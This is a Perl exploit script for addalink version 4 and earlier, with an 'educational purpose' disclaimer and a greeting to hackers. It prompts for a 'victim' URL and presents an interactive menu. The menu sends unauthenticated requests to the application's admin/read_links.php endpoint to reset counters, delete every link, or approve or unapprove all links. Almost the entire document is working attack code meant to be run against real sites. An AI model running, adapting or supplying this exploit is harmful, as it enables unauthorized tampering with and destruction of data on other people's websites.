# addalink <= 4 Arbitrary Admin Access Vulnerability Exploit
# url: http://sourceforge.net/projects/addalink/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Greetz To: All Hackers and milw0rm website

#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;

print "Insert host/path:(ex: http://www.site.com/linkliste/)\n";
$host=<STDIN>;
chomp $host;
print "\n";

# Si la url no tiene http: al principio
  if ( $host   !~   /^http:/ ) {

    # lo añadimos
    $host = 'http://' . $host;
}

# Si la url no tiene / al final
  if ( $host   !~   /\/$/ ) {

    # lo añadimos
    $host = $host . '/';
}

print " Victim: $host \n\n";

menu:;



print "Menu:\n";

print "\n";



print "1.  Reset all counters\n";

print "2.  Delete all links\n";

print "3.  Approve all links\n";

print "4.  Unapprove all links\n";
print "";
print "5.  Exit\n\n";

print "Option:";

$opcion=<STDIN>;



if ($opcion>=1 && $opcion<=5 ) 

{



if ($opcion==1)

{

&Reset_all_counters

}

if ($opcion==2)

{

&Delete_all_links

}

if ($opcion==3)

{

&Approve_all_links

}

if ($opcion==4)

{

&Unapprove_all_links

}

if ($opcion==5)

{

exit(1);

}}

else
{
print "Option incorrect\n";

goto menu;
}

####

sub Reset_all_counters
{

$poc="admin/read_links.php?action=resetcounter";

$final="$host$poc";
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

print "\n$final\n";

if ($response->is_success) {
print "[+] Reset all counters\n\n";
}
else {
print "[-] Reset all counters\n\n";
}

print "\n";

print "Press enter to go to menu.";

$volver=<STDIN>;

goto menu;

}

###

sub Delete_all_links
{

$poc="admin/read_links.php?action=deleteall";

$final="$host$poc";
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

print "\n$final\n";

if ($response->is_success) {
print "[+] Delete all links\n\n";
}
else {
print "[-] Delete all links\n\n";
}

print "\n";

print "Press enter to go to menu.";

$volver=<STDIN>;

goto menu;

}

###

sub Approve_all_links
{

$poc="admin/read_links.php?action=approveall";

$final="$host$poc";
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

print "\n$final\n";

if ($response->is_success) {
print "[+] Approve all links\n\n";
}
else {
print "[-] Approve all links\n\n";
}

print "\n";

print "Press enter to go to menu.";

$volver=<STDIN>;

goto menu;

}

###

sub Unapprove_all_links
{

$poc="admin/read_links.php?action=unapproveall";

$final="$host$poc";
my $req=HTTP::Request->new(GET=>$final);
my $ua=LWP::UserAgent->new();
$ua->timeout(30);
my $response=$ua->request($req);

print "\n$final\n";

if ($response->is_success) {
print "[+] Unapprove all links\n\n";
}
else {
print "[-] Unapprove all links\n\n";
}

print "\n";

print "Press enter to go to menu.";

$volver=<STDIN>;

goto menu;

}

# __EOF__

